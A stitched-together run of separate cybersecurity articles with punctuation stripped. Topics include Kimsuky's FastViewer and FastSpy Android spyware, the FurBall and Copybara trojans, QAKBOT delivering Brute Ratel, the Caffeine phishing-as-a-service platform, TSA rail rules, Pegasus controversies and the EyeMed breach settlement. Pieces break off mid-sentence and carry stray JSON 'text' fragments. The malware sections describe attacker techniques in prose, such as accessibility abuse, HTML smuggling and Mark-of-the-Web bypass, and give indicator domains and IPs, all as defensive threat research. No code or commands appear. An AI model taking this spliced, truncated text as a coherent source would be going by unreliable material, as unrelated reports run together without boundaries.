document viewer application used to view Microsoft Word PDF or Hangul hwp documents and the number of downloads on the Google Play store is over 10 millionFastViewer normally performs a document viewer but when reading a document file specially created by an attacker it performs malicious behaviors The first 4 bytes of the file are checked to determine whether the document was created by the attacker and if the conditions are met device information is transmitted to the CC server After that FastViewer additionally downloads FastSpy malware and executes it in memory to perform additional malicious actionsFastViewer is a repackaged APK by adding arbitrary malicious code inserted by an attacker to the normal Hancom Office Viewer app and the package name app name and icon are very similar to the normal app1 String decryption algorithmThe string used in FastViewer is decrypted by the custom algorithm The encrypted string is used as the first argument and the index of the key table is used as the second argument After obtaining a key pair using the value of the XOR key table corresponding to the index XOR is performed alternately from the back of the encrypted string2 Request permissionsFastViewer requests additional permissions from users for malicious actions such as receiving commands persistence and spying FastViewer abuses accessibility so it is checked whether accessibility is enabled before performing malicious behaviors3 Check the header of document filesMalicious behavior operates when a special document file created by an attacker is read by checking whether the first 4 bytes of the file are EDC It then changes EDC to the original 4 bytes converting it to a normal document and displaying it to the user executing malicious behavior in the backgroundAccording to the calling condition malicious behavior is performed that meets the condition according to the variable StrOpt4 CC CommunicationFastViewer collects the information of the device and sends it to the CC server as an ati parameter If the app acquires permissions on the device and successfully gets the Devices IMEI value the ati parameter is assigned Kur-Device IMEIDevice IMEI If IMEI value cannot be acquired due to permission failure or other problems ati is assigned Kur-nullerrorimeiAfter that the data that FastViewer receives from the CC server is as follows and it determines whether to download additional modules by comparing the version variable defined in the FastViewer with the version value received from the server If the response value is ok only simple information stealing is performed and an additional module is not downloadedAs above when information about the additional module is successfully received the request for downloading the module is sent to the CC server The version value is the value received from the server5 Download an additional module FastSpyThe downloaded module is a compressed DEX file and the original data is extracted through base64 decoding and GZIP decompression in memory The extracted file is FastSpy which performs remote controlAfter data extraction the malicious class in the DEX in memory is dynamically called by calling the LoadClass API that matches the SDK version of the device If the class is successfully called the decrypted DEX is saved as imageversionbin in the app install pathWhen FastSpy is executed the internally stored CC server information is compared with the information previously received from the CC server If the two values are different the information is updated in memory with the information received from the serverFastSpy could abuse the accessibility API obtained from FastViewer to get additional privileges without the users consent If FastSpy requests specific permission for malicious behaviors a pop-up window requesting permission is displayed In this case FastSpy automates the function of clicking the Agree button in the window so that FastSpy acquires the permission itself without interaction with users However it isnt actually called in FastSpy we securedFastSpy can take control of infected devices hijack phone and SMS information or identify the devices location and whether it is used via camera microphone speaker GPS or KeyStroke in real-timeIn addition the attacker can access files on the infected device and send them to the CC server To exfiltrate the file is compressed with the gzip algorithm and base64 encoding as used in FastSpyFastSpy and AndroSpy have similar characteristics in the method name message format functions and code AndroSpy is an open-source RAT malware that was released in 2018 and has the characteristic that methods and key variables are in TurkishComparing the CC URL released at the time and FastFires CC URL the same domain was used for both campaigns and the path under the temp directory was used In addition the group mainly impersonates Korean large portal sites Naver and Daum in order to steal information from the targetThe domains navernnailcom goooglesecuritycom used by the FastFire malware have a history of pivoting to 2310612216 in the past and this IP was also used as a distribution site and CC server for FastViewer and FastSpyIn that the signature date of FastViewer and that of FastFire are included within the period in which the navernnailcom domain which was bound to 2310612216 Singapore all three malware and infrastructure are used by Kimsuky at the same timeIn addition the fact that goooglesecuritycom an additionally verified CC server of FastFire also supports this pointDuring the analysis there was a directory listing vulnerability in navernnailcom so we were able to collect files existing on the server Among them the keypstxt file has a code similar to the keylogging script used by the Kimsuky group in the past and the same mutex name is also usedIn addition the infosctxt file was also confirmed to have similarities with Kimsuky group February 18 2022 the malicious document disguised as the customer center of Klip a virtual asset wallet service in Korea downloaded a very similar scriptKimsuky group has continuously performed attacks to steal the targets information targeting mobile devices Firebase a normal service used as the CC server in FastFire is their advanced tactic In addition various attempts are being made to bypass detection by customizing Androspy an open-source RAT In the future caution is required as the Kimsuky group may distribute malicious codes with similar functions and variants to Android devicesLike FastViewer sophisticated attack vectors are used to attack only specific targets and existing open sources are actively used to create high-performance variants such as FastSpy Since Kimsuky groups mobile targeting strategy is getting more advanced it is necessary to be careful about sophisticated attacks targeting Android devices----S2W BLOGS2W is specializing in cybersecurity

campaign continues targeting Iranian citizens with a new version of the FurBall malware masquerading as an Android translation app20 Oct 2022 6 min readESET researchers recently identified a new version of the Android malware FurBall being used in a Domestic Kitten campaign conducted by the APT-C-50 group The Domestic Kitten campaign is known to conduct mobile surveillance operations against Iranian citizens and this new FurBall version is no different in its targeting Since June 2021 it has been distributed as a translation app via a copycat of an Iranian website that provides translated articles journals and books The malicious app was uploaded to VirusTotal where it triggered one of our YARA rules used to classify and identify malware samples which gave us the opportunity to analyze itThis version of FurBall has the same surveillance functionality as previous versions however the threat actors slightly obfuscated class and method names strings logs and server URIs This update required small changes on the CC server as well precisely names of server-side PHP scripts Since the functionality of this variant hasnt changed the main purpose of this update appears to be to avoid detection by security software These modifications have had no effect on ESET software however ESET products detect this threat as AndroidSpyAgentBWSThe analyzed sample requests only one intrusive permission to access contacts The reason could be its aim to stay under the radar on the other hand we also think it might signal it is just the preceding phase of a spearphishing attack conducted via text messages If the threat actor expands the app permissions it would also be capable of exfiltrating other types of data from affected phones such as SMS messages device location recorded phone calls and much moreKey points of this blogpostThe Domestic Kitten campaign is ongoing dating back to at least 2016It mainly targets Iranian citizensWe discovered a new obfuscated Android Furball sample used in the campaignIt is distributed using a copycat websiteThe analyzed sample has only restricted spying functionality enabled to stay under the radarThis malicious Android application is delivered via a fake website mimicking a legitimate site that provides articles and books translated from English to Persian downloadmaghalehcom Based on the contact information from the legitimate website they provide this service from Iran which leads us to believe with high confidence that the copycat website targets Iranian citizens The purpose of the copycat is to offer an Android app for download after clicking on a button that says in Persian Download the application The button has the Google Play logo but this app is not available from the Google Play store it is downloaded directly from the attackers server The app was uploaded to VirusTotal where it triggered one of our YARA rulesIn Figure 1 you can see a comparison of the fake and legitimate websitesFigure 1 Fake website left vs the legitimate one rightBased on the last modified information that is available in the APK downloads open directory on the fake website see Figure 2 we can infer that this app has been available for download at least since June 21st 2021Figure 2 Open directory information for the malicious appThis sample is not fully working malware even though all spyware functionality is implemented as in its previous versions Not all of its spyware functionality can be executed however because the app is limited by the permissions defined in its AndroidManifestxml If the threat actor expands the app permissions it would also be capable of exfiltratingIt can also receive commands to take photos and record video with the results being uploaded to the CC server The Furball variant downloaded from the copycat website can still receive commands from its CC however it can only perform these functionsFigure 3 shows permission requests that do need to be accepted by the user These permissions might not create an impression of being a spyware app especially given that it poses as a translation appFigure 3 List of requested permissionsAfter installation Furball makes an HTTP request to its CC server every 10 seconds asking for commands to execute as can be seen in the upper panel of Figure 4 The lower panel depicts a theres nothing to do at the moment response from the CC serverFigure 4 Communication with CC serverThese latest samples have no new features implemented except for the fact that the code has simple obfuscation applied Obfuscation can be spotted in class names method names some strings logs and server URI paths which would also have required small changes on the backend Figure 5 compares the class names of the older Furball version and the new version with obfuscationFigure 5 Comparison of class names of the older version left and new version rightFigure 6 and Figure 7 display the earlier sendPost and new sndPst functions highlighting the changes that this obfuscation necessitatesFigure 6 Older non-obfuscated version of codeFigure 7 The latest code obfuscationFigure 8 Non-obfuscated version of the malware detected by 2864 enginesFigure 9 Obfuscated version of the malware detected by 463 engines when first uploaded to VirusTotalThe Domestic Kitten campaign is still active using copycat websites to target Iranian citizens The operators goal has changed slightly from distributing full-featured Android spyware to a lighter variant as described above It requests only one intrusive permission to access contacts most likely to stay under the radar and not to attract the suspicion of potential victims during the installation process This also might be the first stage of gathering contacts that could by followed by spearphishing via text messagesBesides reducing its active app functionality the malware writers tried to decrease the number of detections by implementing a simple code obfuscation scheme to hide their intensions from

        "text": "The Transportation Security Administration TSA unveiled new cybersecurity regulations for passenger and freight railroad carriers this week expanding its list of critical infrastructure industries given specific guidelines for how to protect their systemsThe rules take effect on October 24 and will last one year In the meantime TSA is beginning a process to establish regulatory requirements for the rail sector following a public comment periodCarriers are now mandated to develop network segmentation policies and controls that separate operational technology systems from other IT systems in case of compromiseOrganizations in the industry will need to establish TSA-approved cybersecurity implementation plans that describe specific cybersecurity measures the passenger and freight rail carriers are utilizing to achieve the security outcomes set forth in the security directiveTSA also wants carriers to create cybersecurity assessment programs that allow officials to proactively test and regularly audit the effectiveness of cybersecurity measures and identify and resolve vulnerabilities within devices networks and systemsTSA Administrator David Pekoske said the agency worked closely on the new rules with multiple stakeholders in the railroad industry the Cybersecurity and Infrastructure Security Agency CISA and the Federal Railroad AdministrationSeveral operational technology experts focused on the network segmentation aspect of the new regulations as something that may be difficult for the rail industryGuidePoint Securitys Chris Warner said resources in the railway industry are limited when it comes to cybersecurity not only in terms of financial budgets but also a shortage of knowledgable employees who can implement mature cybersecurity regulations and modern approachesThe requirement of network segmentation policies and controls will be quite a lift for railway operators as many will have to re-design much of their control systems he saidWhile this is certainly a step in the right direction for transportation we will see some bumps in the road as the railway industry will have to modernize away from legacy systems and add in new access controlsOthers like Shift5 CEO Josh Lospinoso threw cold water on the effort calling the idea of air gapping systems or separating them from IT systems a myth in the era of converged ITOT operational technology within infrastructureNo longer can we consider critical operational technology components like brake controls on locomotives segmented away from IT Lospinoso explained With such interconnectivity network segmentation policies should be implemented but not used as the last-line of defenseCybersecurity professionals have been calling for the other regulatory components of the directive for years according to Nozomi Networks security research evangelist Roya GordonGordon noted that as the rail industry continues to become more automated cyber risks have increased making the potential consequences of a cyber event damaging and deadlyThe TSA directive isn't holding the rail industry to some new unattainable and overly complex standard Gordon told The Record Finally the government is listening Industry is listening This is a great win for critical infrastructure securityWhile the attack did not cause any damage and no riders were put at risk city officials raised alarms in a report because the attackers could have reached critical systems and may have left backdoors in the system Former US Defense Department cybersecurity advisor Padraic O'Reilly said that while the gradual rollout of cybersecurity rules to the sectors that are under voluntary guidance has been criticized he noted that the inclusion of CISA and others in the development process was the right approachO'Reilly now chief product officer for CyberSaint Security said the particulars of the latest proposed directive seemed to avoid the conspicuous mistakes that TSA made with the pipeline industry and are less prescriptive with respect to operational technologyI am also pleased to see the phrase using a risk-based methodology as I am in risk management and this is really the only way to rationally approach patch management across both IT and OT systems he saidIf I had to guess I would say that many of the passenger carriers have some maturity with respect to the proposed practices particularly around the creation of access control measures to secure and prevent unauthorized access to critical cyber systemsThe most difficult part for rail operators will be around continuous monitoring and detection O'Reilly explained adding that even highly mature companies struggle with thisDoing it properly with an operations and command infrastructure can be capital intensive he said Broadly speaking none of the requirements are unreasonable for a critical infrastructure concern to implement The Association of American Railroads AAR has indicated that the directive effectively codifies the voluntary guidance that they have been providing for years I will be very interested to see how this advances to rulemaking through the comments process he saidJonathan Greig is a Breaking News Reporter at Recorded Future News Jonathan has worked across the globe as a journalist since 2014 Before moving back to New York City he worked

        "text": "Off-the-shelf spyware has long been associated with abuses by autocratic regimes but in recent years its democracies who are reckoning with the their own potential abuse of such surveillance toolsSophisticated digital surveillance tools were once only available to a handful of government intelligence operations But mercenary software-as-a-service operations like Pegasus from Israeli firm NSO Group have made such powers accessible to practically any government willing to payAnd many have been including regimes who appear to have used it as a tool of digital oppressionWhat we've seen in recent years is that actually it may not just be autocrats and dictators who seek these services John Scott-Railton a senior researcher at the University of Torontos Citizen Lab told The Record Clearly the temptation to use this spyware is very great even in democracies its an irresistible temptationThe spyware allows attackers to target victims' smartphones which are now often treasure troves of information about all aspects of our lives and contain microphones and cameras that can be used for intimate surveillanceI think we haven't seen the last of these cases Scott-Railton said It's pretty clear that Mexico again has a Pegasus problem and it's unfortunate that the state is choosing an approach of distractionBut as lawmakers around the world learn more about how such tools have already been used theyre still grappling with how to respondHowever the committee has limited investigatory powers and the global scale of the issue complicates building a legal framework to effectively prevent future abuse of such toolsMeanwhile victims of abusive deployment of spyware currently lack meaningful options of redress something that must change according to Rand Hammoud surveillance campaigner at digital human rights organization Access NowThose who have been spied upon must be able to get redress from both the governments who do the illegal spying and the companies that knowingly provide them with the specific tools to do so said Hammoud Both parties must be able to provide adequate compensation or other forms of effective redressReports of abuse involving Pegasus in Mexico emerged years before the Pegasus Project was published and are still comingEven in the face of global scrutiny domestic outcry and a new administration that pledged to never use spyware the targeting of journalists and human rights defenders with Pegasus spyware continued in Mexico Citizen Lab reportedOn October 14 the Twitter account for the government of Mexico also tweeted an apparent attempt at damage control highlighting that Citizen Lab found no specific technical forensic link between SEDENA and Pegasus in the recent report Scott-Railton clapped back citing records indicating the Mexican Army contracted with firms that appear to be proxies for Pegasus serviceIn this case evidence has been presented to the judicial authority indicating that the NSO Group company was illegally selling the PEGASUS system while at the same time using it on its own to deliver the information to other people the statement translated from Spanish saidScott-Railton sees three potential options given the Mexican governments response to the report President Lpez Obrador knows Pegasus is being deployed and is denying it its being deployed and he doesnt know it or victims were targeted by another party which still represents a national security threat for MexicoNSO Group has long said including in sworn testimony it only sells its product to governments The company did not respond to a request for comment for this storyThis weeks announcement from Basave the Mexican opposition lawmaker whose device was infected suggests political motivation behind the spying He is close to a potential 2024 presidential candidate Luis Donaldo Colosio Riojas and a member of the Chamber of Deputies the lower house of Mexicos federal legislatureMexico is far from alone in dealing with NSO Group controversyCongress has continued to investigate spyware like Pegasus in hearings this year and the Biden administration remains engaged on the issueThese are really concerning troubling cases and none of them seem to be anywhere near resolved Scott-Railton told The RecordThe scope of the issues is vast but not always easy to accessThe committee is expected to make recommendations based on its findings and many human rights observers are hoping it stakes out a strong anti-spyware position such as a full ban that can help reset regional and international practicesWhat is absolutely clear is that the abuses have far outpaced the oversight and may have far outpaced the rule of law and that has to be rectified Scott-Railton told The RecordHe and others who have long warned about the risks posed by tools like Pegasus see momentum buildingAccording to Hammoud many of the apparent abuses already violate international and local norms around human rightsThe tide has turned for the spyware industry and the world is realizing that no entity can fully be trusted to employ this technology while upholding human rights under international lawAndrea

        "text": "The states investigation into the insurer found EyeMeds lack of compliant cybersecurity risk assessment to evaluate and address the risks to its information systems and non-public information stored on its networks left EyeMed vulnerable to threat actors including the threat actor who initiated the cyber event according to the reportThe settlement was announced as part of New Yorks Department of Financial Services cybersecurity regulation that mandates a set of responsible security standards for businesses Drawn into effect in March 2017 it served as a model for other regulators including the FTC multiple states and other security models The law includes standards for industry compliance consumer data protection cybersecurity controls and timely reporting of cybersecurity events The DFS investigation into EyeMed found multiple violations of these requirementsIt is critically important that consumers non-public information is kept safe from potential criminal activity Superintendent of Financial Services Adrienne A Harris said in the release This settlement demonstrates DFSs ongoing commitment to protecting consumers while ensuring the safety and soundness of financial institutions from cyber threatsDFS launched an investigation into EyeMed following its breach notification in December 2020 that reported an email hack first discovered five months earlier A threat actor used the access to a single employee email account to send phishing emails to contacts within the address bookFirst EyeMed did not disclose that the attacker actually sent at least 2000 phishing emails from the compromised account during the dwell time The emails impersonated proposal requests that aimed to dupe victims into sharing their credentialsFurther the IT team received inquiries from clients and detected the suspicious transmissions on July 1 While EyeMed previously reported the account access was blocked and secured on the same day it was discovered the previous investigation found the hack began a week before it was discoveredIn total the data of 21 million current and former vision benefits members of multiple insurance clients was compromised by the incidentThe data included vision and health insurance account and identification numbers Medicaid or Medicare numbers drivers licenses government IDs and birth or marriage certificates Some members saw their Social Security numbers financial data diagnoses health conditions treatments and other sensitive dataThe findings of the DFS investigation into EyeMed found deeper security failings than previously disclosedThe audit revealed that EyeMed had violated the DFSs cybersecurity regulation by failing to implement multi-factor authentication within its email environment The state regulation requires MFA to be used for any users accessing a covered entitys internal network from an external networkAt the time of the cyber event EyeMed was in the process of rolling out MFA for its email environment but did not yet have MFA implemented for the mailbox as required by the cybersecurity regulation according to the reportIn addition EyeMed transitioned its email system to Microsoft Office 365 18 months before the hack Although the regulation went into effect on March 1 2018 the MFA implementation did not begin until March 2020 two years later The O365 accessed the internal networks during the time MFA was not fully implemented The MFA project was not completed until September 2020DFS found that the delay in MFA implementation left EyeMeds information systems and its consumers non-public information vulnerable to threat actorsFurther the investigation found the insurer failed to limit user access privileges In fact nine employees were allowed to share login credentials to the email account behind the weeklong hackEyeMed also failed to implement sufficient data retention and disposal processes required by DFS Namely the hacked account contained over six years worth of consumer non-public information including that of minors To DFS had these controls been in place the July 1 2020 cybersecurity event could have been prevented or been limited in scopeDFS also found EyeMed hadnt conducted an adequate risk assessment between 2018 and 2021 which would have identified the access privilege and data disposal risks tied to its email accountsNotably had EyeMed conducted the risk assessment it could have avoided several of the violations found by DFC including the requirement to leverage an adequate risk assessment to then build an effective cybersecurity program able to address information security access controls and identity management and customer data privacyThe finding also suggests that after discovering the email hack and conducting its investigation over the course of five months in 2020 EyeMed still didnt perform a risk assessment for more than a year after the incident A risk assessment is not only a core requirement of DFS its also mandated by The Health Insurance Portability and Accountability ActThe report shows to date EyeMed has not conducted a risk assessment that complies with the requirements of the cybersecurity regulation Although the insurer has a third-party vendor conduct periodic audits of its IT controls and enterprise risk management reviews it does not meet the regulatory standards Whats more these vendor assessments did not cover the email system where the hack occurredDFS added that as a result EyeMeds cybersecurity certifications for the calendar years 2018 through 2021 were improperLastly EyeMed was also found to have violated the DFS requirement to annually certify compliance with the cybersecurity regulationThe multi-million dollar settlement also requires EyeMed to undertake significant remedial measures to better secure its data The insurance carrier must take on a comprehensive cybersecurity risk assessment then develop a plan to address any risks identified during its audit DFS will then review and approve the planThe voice of healthcare cybersecurity and policy for SC Media CyberRisk Alliance driving industry-specific coverage of what matters

analyzed a QAKBOT-related case leading to a Brute Ratel C4 and Cobalt Strike payload that can be attributed to the threat actors behind the Black Basta ransomwareBy Ian Kenefick Lucas Silva Nicole HernandezOctober 12 2022Read time wordsSave to FolioA recent case involving the QAKBOT BB distributor led to the deployment of Brute Ratel detected by Trend Micro as BackdoorWin64BRUTEL a framework similar to Cobalt Strike as a second-stage payload This is a noteworthy development because it is the first time we have observed Brute Ratel as a second-stage payload via a QAKBOT infection The attack also involved the use of Cobalt Strike itself for lateral movement We attribute these activities to the threat actors behind the Black Basta ransomwareIntrusion timelineBrute Ratel is a commercial paid Adversary Emulation framework and a relative newcomer to the commercial CC Framework space where it competes with more established players such as Cobalt StrikeAdversary Emulation frameworks like Brute Ratel and Cobalt Strike are marketed to penetration testing professionals Red Teams for use in legitimate penetration testing activities in which organizations seek to improve their ability to detect and respond to real cyberattacks These frameworks are used to provide hands-on keyboard access from remote locations to emulate the tactics techniques and procedures TTPs used by attackers in network intrusionsOn top of Cobalt Strikes legitimate use cases it has gained notoriety for its illicit usage and near omnipresence in high-profile human-operated ransomware attacks during the past few years It serves as a common second-stage payload from Botnets such as QAKBOT TrojanSpyWin64QAKBOT IcedID TrojanSpyWin64ICEDID Emotet TrojanSpyWin64EMOTET and Bumblebee TrojanWin64BUMBLELOADER among others Unfortunately several versions of Cobalt Strike have been leaked over the past couple of years accelerating its malicious use by cybercriminalsAs a result of its popularity compared to Brute Ratel its detection coverage is greater than that of the latter This makes Brute Ratel and other less established CC frameworks an increasingly more attractive option for malicious actors whose activities may remain undetected for a longer periodBrute Ratel has recently attracted greater interest from threat actors in the cybercriminal underground where versions of the framework are actively traded and cracked versions circulated It is unknown how Brute Ratel was initially leaked but its developers have acknowledged the leak on TwitterQAKBOT BB to Brute RatelThe campaign commences via a SPAM email containing a malicious new URL being sent to potential victims The URL landing page presents the recipient with a password for a ZIP fileThe use of password-protected ZIP files at this stage is likely an attempt to evade analysis by security solutionsThe ZIP file contains a single ISO file The use of an ISO file is an attempt to defeat the Mark of the Web MOTW which tags files as being downloaded from the internet It subjects these files to additional security measures by Windows and endpoint security solutionsThe ISO file contains a visible LNK file that uses the Explorer icon and two hidden subdirectories each containing various files and directories By default on Windows operating systems hidden files are not displayed to the user

environment before any final actions could be taken We assess based on the level of access and discovery activity that the likely final actions would have been a domain-wide ransom deploymentQAKBOT Obama to Brute RatelIn another more recent incident Trend Micro Research spotted QAKBOT using the Obama distributor ID prefixie Obama208 also dropping Brutel Ratel C4 as a second-stage payloadIn this case the malware arrives as a password-protected ZIP file delivered via HTML smuggling which allows the attacker to smuggle an encoded malicious script into an HTML attachment or web page Once the user opens the HTML page in the browser the script is decoded and the payload is assembledOnce the ZIP file is decrypted using the password provided in the HTML attachment the user is presented with an ISO file The malicious files are contained in the ISO file which is used as a Mark of the Web bypass Inside an ISO file bears the following directory structureSince QAKBOTs return we have observed multiple varieties in the execution chain from scripting languages to file extensions and the use of export function names and ordinals For this infection the following variation was usedThe infection plays out with the same TTPs Tactics Techniques and Procedures described in the first kill chain in this blog However one notable difference was observed in the CC configuration which used DNS over HTTPS DoH vs a more traditional HTTPS CC Channel The CC servers observed used HTTPS with Lets-EncryptBy using DoH attackers can hide DNS queries from CC domains If SSLTLS traffic is not being inspected using man-in-the-middle MitM techniques DNS queries to the CC server will therefore go unnoticedOrganizations should take note of the trending use of Cobalt Strike in attacks

        "text": "12 October 2022During one of our latest investigations ThreatFabrics analysts uncovered a network of phishing websites targeting Italian online-banking users and aiming to steal their banking credentials Further research defined a connection between this network and the Android banking Trojan dubbed Copybara that is involved in telephone-oriented attack delivery performed by the threat actors Latest version of it introduced unique feature that allows to build and show dynamic fake forms on the fly With the increase in popularity of voice phishing vishing attacks where criminals coach victims into installing Android banking malware we are entering a new era of hybrid fraud attacks Despite the popularity of this technique and the clear trend based on campaigns discovered vishing used as malware distribution tactic is currently not covered by MITRE mobile matrixThe campaign discovered by our analysts is targeting multiple Italian banks and their customers It involves multiple phishing sites impersonating several Italian financial services and anti-fraud offices as it can be seen on the following screenshotsTo maintain and manage the large number of phishing pages used in these campaigns the threat actors used several phishing kits that are quite well-known in the underground scene Such kits allow to easily create the phishing page automatically register phishing domain names and create a short link for it to be used in distribution Besides they also provide a panel that allows to maintain all created websites and monitor their activity Such panel is also provided as a service by one of the cybercriminal groups on the underground forumAll phishing sites seen in the campaign request similar set of personal data account number PIN code telephone number Our team noticed that in some cases cybercriminals request victims to choose secret questions and answers that were set during the registration process with the bank as second factor of authentication Obviously collecting this data can help cybercriminals to get access to victims banking accountsAfter submitting the data victims are notified that a support operator will contact them soon using the previously collected phone number At this point the next step of the campaign takes place the installation of Android banking Trojan with the help of the operator as part of telephone-oriented attack delivery TOAD The threat actor calls victims and gives instructions to install the necessary security app on victims deviceTelephone-oriented attack delivery threats involve direct call between cybercriminals eg malicious call center and a victim During this call the victim is being convinced and instructed to install some additional software on hisher devices in order for threat actor to be able to perform some further fraud The installed software can be legitimate remote access tools that are used by cybercriminals to have a remote control over victims deviceHowever in some cases the victim is instructed to download and install some specific malicious software developed or maintained by threat actors This is the case for the campaign discovered by ThreatFabric analysts which involves both phishing sites and subsequent TOAD with installation of Copybara Android banking TrojanAs an entry point for cybercriminals the victim is asked to install a downloader app that will download the actual payload The payload then is installed as an update for the downloader substituting itOur research also reveals the name of the threat used by the TAsJoker Coincidentally this name is also used by another Android malware family usually distributed through Google Play and which specializes in personal information stealing and Subscription services fraud ThreatFabric can confirm that there is no connection with this malware family and the one discussed in this blogpost distributed via TOAD To avoid confusion we will refer to this new malware family with the initial name that we assigned to it upon discovery which is CopybaraFirst samples of Copybara seen by ThreatFabric date back to November 2021 Despite the fact that it was referred as BRATA by other researchers TF analysts were able to clearly define it as a separate family despite using the same framework for development The name Copybara was given by our malware analysts is reference to TAs development process Copybaras code has a lot of parts directly copied and pasted from other publicly available modules Sometimes like for example with Copybaras downloader the code is taken as-is with minor changes in variablesHowever such approach does not directly imply the weakness of the malware Despite the code being messy and full of non-active sections the TAs managed to equip the Trojan with remote access capability which tries to masquerade itself as security udpate while the criminals are performing actions on the infected device behind the curtains While the TA is connected to infected device Copybara shows a fake overlay that is semi-transparent to cover the actions of the cyber criminalsIt allows actors to stay low and not drag attention of the victim while performing fraudulent actions within the banking applications using data previously stolen with phishing Copybaras RAT capabilities are powered by abusing the AccessibilityService the C2 server sends a specific commandaction to perform and Copybara handles it with the help of its Accessibility engine TAs can open arbitrary apps install additional ones perform clicks and swipes enter text to the text fields etcTF received reports that TAs use Copybaras ability to uninstall packages in order to remove the original banking app to leave the detection window as small as possibleAnother quite unique feature recently introduced by authors is the ability to dynamically build fake input forms and show it to victims Actors are able to specify arbitrary input fields text labels check boxes and collect even more data from victims At the moment these forms are quite simplistic but the dynamic approach allows TAs to use full power of Android OS to build genuine-looking screens on-the-flyThe full list of supported commands of Copybara is provided belowFurther investigation of the infrastructure utilized by the threat actors reveals certain interesting ties to other Trojans One of the campaigns involved SMS stealing Trojan This piece of malware is quite simple in its capabilities only allowing the actors to get control over incoming messages all the incoming SMS messages are uploaded to TAs server thus allowing the TA to perform so-called new device registration fraud and log in with other channel eg web and intercept all OTPs sent by bank to validate login and further transactionsTelephone-oriented attack delivery TOAD cases are becoming a trend on the current mobile threat landscape Personal approach powered with social engineering techniques allow cybercriminals to trick unsuspicious victims and obtain installations of their Trojans with high likelyhood of success Moreover most of the cases end up installing some legitimate remote access tools that are not flaggeddetected by antivirus enginesWe believe that such complicated cases involving threat actor - victim interaction should not be approached in a conventional traditional way Behaviour analytics powered by strong Threat Intelligence is a way to cope with such fraudulent activity as it provides additional indicators to detect suspicious activityThreatFabrics Fraud Risk Suite enables safe frictionless online customer journeys by integrating industry-leading mobile threat intel behavioural analytics advanced device fingerprinting and over 10000 adaptive fraud indicators This will give you and your customers peace of mind in an age of ever-changing fraud"

an email sent to a European architectural consulting firm containing a suspicious URL While the contents of the email were not recovered in their entirety domain data contained within the phishing email eduardorodiguez9584ongraphycom which resolved to IP address 13420915627 around the time of the activity was recovered and subsequently analyzedAdditionally the second-stage lure page being hosted on the compromised portion of the site during the period of time at which it was compromised was ultimately misconfigured by the attacker see Figure 3If it were correctly configured the page shown in Figure 3 would likely display the final lure page for a campaign as configured by the Caffeine userattacker typically a fake Microsoft 365 login page see Figure 4 Yet the error message on this page indicates that the associated phishing domain was not configured correctly within the Caffeine platform infrastructure and offers attackers a support link to get help with this issue While this shows an admirable dedication to user experience on the part of the Caffeine engineers the provided link to create a support ticket is also a direct link to the support page within the Caffeine platform In the event a user accessing the support URL is not logged in as a configured user of the platform at the time they access the link they are simply redirected to the Caffeine login page see Figure 5Over the course of its research into the Caffeine platform Managed Defense observed newer versions of the error page that have replaced the support ticket URL portion with support contact information for an encrypted messaging service instead This is a good operational security improvement on the part of the platform engineersA properly configured and campaign-ready end-to-end implementation of the Caffeine Phishing Platform has several elements three of which areEach of these aspects are explored in detail in the following sectionsLike any other modern Software-as-a-Service SaaS platform the core of Caffeines infrastructure for a new user begins with the creation of a user account While not all PhaaS platforms function in this manner in Caffeines case the web site itself is open to the public all you need to know is the URL It is possible to register for an account with no significant disclosure of information and no external validation mechanisms such as endorsement through other existing Caffeine users to access the siteOnce registered a new Caffeine user is then directed to the services main index page to begin their phishing voyages see Figure 6 It is worth noting that over the course of its investigation into the Caffeine platform Managed Defense observed Caffeines administrators announce several key platform improvements via the Caffeine news feed including feature updates and expansions of their accepted cryptocurrenciesIn addition to word of mouth via its existing users Caffeine is also advertised on underground forums dedicated to cybercrime Figure 7 shows a post on nulledto advertising an email management component for Caffeine as well as other seemingly malicious utilities that appear to be associated with the same malware authorAnother example is a post from the site craxtube demo-ing an older version of some of the platforms features as shown in Figure 8As is typical of most modern SaaS platforms Caffeine does not support perpetual use licenses and is wholly subscription based Additionally as modern subscription-based software design doctrine dictates Caffeine offers three different tiers of serviceMuch of the Caffeine platform feature-set allows users to pick and choose granular configuration settings for use in their credential phishing campaigns As mentioned previously this includes but is not limited to self-service mechanisms to customize dynamic URL schemas to assist in dynamically generating pages with potential victim information pre-populated for additional campaign chicanery see Figure 9 first-stage campaign redirect pages and final lure pages It also includes several options to blacklist IP addresses within CIDR ranges and block connections based on their points of origin see Figure 10Once an attacker has configured the necessary components of their main campaign tooling as shown in Figure 10 they must then deploy their tooling conventionally referred to as phishing kits to their hosted campaign infrastructure After that step is complete all that is left to do is connect their deployed kits to their main Caffeine account via a special license token At that point an attacker is ready to go phishing For most traditional phishing campaigns phishermen generally employ two main mechanisms to host their malicious content They will typically leverage purpose-built web infrastructure set up for the sole purpose of facilitating their phishing voyages use legitimate third-party sites and infrastructure compromised by attackers to host their content or some combination of bothGiven the prevalence of compromised web infrastructure observed by Mandiant across its customer base the authors will focus on this particular avenue of attack for further scenario-based analysis within this blog postThough a full analysis of the general tactics techniques and procedures involved in the deployment of kits to compromised web infrastructure is beyond the scope of this blog post general techniques for deployment of these kits includeNo matter which technique is used however the attackers ultimate goal is to achieve file-write capabilities on hosted web infrastructure Once this is achieved they simply upload the files from their kit and ensure all relevant dependencies are resolvedAt that point in Caffeines case the attacker must also ensure their kits are configured to leverage a user-specific license token This links their deployed kits to their main Caffeine user account and allows them to fully utilize the Caffeine platform and its respective administrative dashboards to effectively manage campaign operationsIf completed correctly the final lure for Caffeine phishing kits will appear as a Microsoft 365 login page similar to the one in Figure 4 Pages like this one are the main mechanism to drive successful credential theft during campaign operationsIf this step is not completed correctly anyone accessing the lure page will instead receive an error message like the one shown in Figure 3Mandiant did not identify additional fake login pages outside of those formatted to appear as Microsoft 365 credential harvesting lures which is consistent with the way this platform is advertised However Mandiant assesses with moderate confidence that additional login page formats will be introduced as Caffeine customer needs shift with technology trendsOnce configuration of the campaign infrastructure is complete the attacker has the option of using a Caffeine-provided email management utility which is offered in both Python or PHP to craft and send their phishing emails to potential victimsBy default Caffeine provides configurable HTML files to embed in outgoing email used in conjunction with the aforementioned sender utilities Several options are available for attackers to use for their phishing email templates including webmail phishing lures targeting users of major Russian and Chinese services see Figure 16 to Figure 19While an extensive comprehensive analysis of every utility and component within the Caffeine platform is well beyond the scope of this blog post several key components of its operation can be used to generate a solid set of high efficacy threat detections when used in concert with one another This rule set is intended to serve as a starting point for hunting efforts to identify phishing infrastructure and activity however they may need adjustment over time as the threat evolves To leverage these detections effectively run the associated Yara rules

